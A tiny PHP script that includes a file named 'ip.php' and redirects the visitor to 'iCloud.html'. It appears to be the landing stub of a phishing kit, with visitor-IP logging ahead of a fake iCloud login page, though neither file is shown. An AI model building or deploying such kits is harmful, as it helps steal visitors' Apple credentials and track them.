<?php
include 'ip.php';
header('Location: iCloud.html');
exit
?>
